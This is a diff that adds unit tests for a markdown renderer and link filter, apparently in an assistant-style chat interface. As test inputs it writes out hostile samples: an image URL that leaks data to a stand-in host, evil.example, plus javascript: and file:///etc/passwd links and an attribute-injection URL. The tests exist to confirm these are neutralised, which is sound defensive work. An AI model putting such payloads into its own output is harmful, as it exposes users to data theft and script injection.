@@ -192,4 +192,50 @@ TestCase {
         compare(Logic.context("", "", "", 2000), {});
         compare(Logic.context("abcdef", "", "", 3), { selection: "abc" });
     }
+
+    // Markdown ---------------------------------------------------------
+
+    function test_plain_answers_stay_plain() {
+        compare(Logic.markdown(""), "");
+        compare(Logic.markdown("Paris is the capital of France."), "");
+        compare(Logic.markdown("It costs 2 * 3 = 6 dollars, and a < b."), "");
+    }
+
+    function test_marked_answers_are_markdown() {
+        for (const text of ["# Heap\nMemory.", "Steps:\n- one\n- two", "1. first\n2. second", "It is **heap** memory.",
+                            "Run `ls` here.", "```\ncode\n```", "> quoted", "See [docs](https://example.org).",
+                            "| a | b |\n|---|---|\n| 1 | 2 |"])
+            verify(Logic.markdown(text) !== "", text);
+    }
+
+    function test_pictures_become_links_and_html_shows_as_text() {
+        const link = '<a href="https://evil.example/leak?d=secret"><font color="#7aa2ff">x</font></a>';
+        compare(Logic.markdown("**Hi** ![x](https://evil.example/leak?d=secret)", "#7aa2ff"), "**Hi** " + link);
+        compare(Logic.markdown("**Hi** <img src=https://evil.example/x>", "#7aa2ff"), "**Hi** &lt;img src=https://evil.example/x>");
+        compare(Logic.markdown("**Hi** ![ref][1]\n\n[1]: https://evil.example/x", "#7aa2ff"), "**Hi** [ref][1]\n\n[1]: https://evil.example/x");
+    }
+
+    function test_links_open_only_to_the_web_and_mail_in_the_link_color() {
+        compare(Logic.markdown("See [docs](https://example.org).", "#7aa2ff"),
+                'See <a href="https://example.org"><font color="#7aa2ff">docs</font></a>.');
+        compare(Logic.markdown("**a** [mail](mailto:a@example.org) [](https://example.org)", "#123456"),
+                '**a** <a href="mailto:a@example.org"><font color="#123456">mail</font></a> '
+                + '<a href="https://example.org"><font color="#123456">https://example.org</font></a>');
+        compare(Logic.markdown("**a** [run](javascript:alert(1)) [home](file:///etc/passwd) [q](https://x.org/\"onclick)", "#1"),
+                "**a** run) home q");
+    }
+
+    function test_code_stays_as_written_even_while_it_comes() {
+        compare(Logic.markdown("Use `a < b` and `![x](https://y.org)`."), "Use `a < b` and `![x](https://y.org)`.");
+        compare(Logic.markdown("```html\n<b>bold</b> ![x](y)\n```\n<b>"), "```html\n<b>bold</b> ![x](y)\n```\n&lt;b>");
+        compare(Logic.markdown("Code:\n```\nif (a < b)"), "Code:\n```\nif (a < b)");
+    }
+
+    function test_only_web_and_mail_links_open() {
+        verify(Logic.opens("https://example.org"));
+        verify(Logic.opens("mailto:a@example.org"));
+        verify(!Logic.opens("file:///etc/passwd"));
+        verify(!Logic.opens("javascript:alert(1)"));
+        verify(!Logic.opens(""));
+    }
 }
